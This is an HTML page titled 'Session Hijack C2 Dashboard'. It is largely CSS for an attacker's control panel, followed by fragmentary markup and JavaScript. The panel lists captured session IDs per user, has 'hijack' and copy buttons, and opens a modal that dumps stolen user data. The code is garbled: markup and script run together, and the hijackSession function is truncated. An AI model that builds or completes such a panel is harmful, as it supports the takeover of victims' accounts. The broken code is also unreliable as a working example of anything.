<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Hijack C2 Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; }
        
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        
        header {
            background: linear-gradient(135deg, #1a1f2e 0%, #0d1117 100%);
            padding: 20px;
            border-bottom: 2px solid #ff00cc;
            margin-bottom: 20px;
            border-radius: 8px;
        }
        
        header h1 {
            font-size: 2em;
            color: #ff00cc;
            text-shadow: 0 0 10px rgba(255, 0, 204, 0.5);
        }
        
        header p { color: #888; margin-top: 5px; }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: #1a1f2e;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #00ffcc;
        }
        
        .stat-card h3 { font-size: 0.9em; color: #888; margin-bottom: 5px; }
        .stat-card .value { font-size: 1.8em; color: #00ffcc; font-weight: bold; }
        
        .user-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }
        
        .user-card {
            background: #1a1f2e;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #2a2f3e;
            transition: transform 0.2s;
        }
        
        .user-card:hover { transform: translateY(-2px); border-color: #ff00cc; }
        
        .user-header {
            background: linear-gradient(135deg, #ff00cc 0%, #3333ff 100%);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .user-name { font-size: 1.3em; font-weight: bold; color: white; }
        .user-status {
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.8em;
        }
        
        .user-body { padding: 15px; }
        
        .session-id {
            background: #0a0e17;
            padding: 10px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            word-break: break-all;
            margin-bottom: 15px;
            border: 1px solid #2a2f3e;
        }
        
        .session-id label { color: #888; display: block; margin-bottom: 5px; font-size: 0.75em; }
        .session-id span { color: #00ffcc; }
        
        .data-section { margin-bottom: 15px; }
        .data-section h4 {
            font-size: 0.85em;
            color: #ff00cc;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .data-item {
            background: #0a0e17;
            padding: 8px;
            border-radius: 4px;
            margin-bottom: 5px;
            font-size: 0.8em;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        
        .data-item .label { color: #888; }
        .data-item .value { color: #e0e0e0; }
        
        .actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        .btn {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.2s;
        }
        
        .btn-hijack { background: #ff00cc; color: white; }
        .btn-hijack:hover { background: #ff33dd; }
        
        .btn-copy { background: #3333ff; color: white; }
        .btn-copy:hover { background: #5555ff; }
        
        .btn-details { background: #00ffcc; color: #0a0e17; }
        .btn-details:hover { background: #33ffdd; }
        
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal.active { display: flex; }
        
        .modal-content {
            background: #1a1f2e;
            padding: 30px;
            border-radius: 8px;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            border: 2px solid #ff00cc;
        }
        
        .modal-content h2 { color: #ff00cc; margin-bottom: 20px; }
        .modal-content pre {
            background: #0a0e17;
            padding: 15px;
            border-radius: 4px;
            font-size: 0.8em;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .close-modal {
            float: right;
            cursor: pointer;
            font-size: 1.5em;
            color: #888;
        }
        
        .close-modal:hover { color: #fff; }
        
        .empty-state {
            text-align: center;
            padding: 60px;
            color: #888;
        }
        
        .empty-state h2 { color: #ff00cc; margin-bottom: 10px; }
        
        .log-section {
            background: #1a1f2e;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
        }
        
        .log-section h3 { color: #00ffcc; margin-bottom: 10px; }
        .log-entry {
            font-family: 'Courier New', monospace;
            font-size: 0.8em;
            padding: 5px 0;
            border-bottom: 1px solid #2a2f3e;
        }
        .log-entry:last-child { border-bottom: none; }
        .log-time { color: #888; }
        .log-msg { color: #e0e0e0; }
    </style>
</head>
<body>
    <div class="container">

        <div class="log-section">

    <div id="detailsModal" class="modal">

            <pre id="modalContent"></pre>
        </div>
    </div>

        function hijackSession(cardId) {

            const sessionId = card.querySelector('.session-id span').textContent;

            });
        }
        
        function showDetails(cardId) {
            const card = document.getElementById(cardId);
            const user = users[card.querySelector('.session-id span').textContent];
            
            document.getElementById('modalTitle').textContent = `Details: ${user.name}`;
            document.getElementById('modalContent').textContent = JSON.stringify(user, null, 2);
            document.getElementById('detailsModal').classList.add('active');
        }
        
        function closeModal() {
            document.getElementById('detailsModal').classList.remove('active');
        }
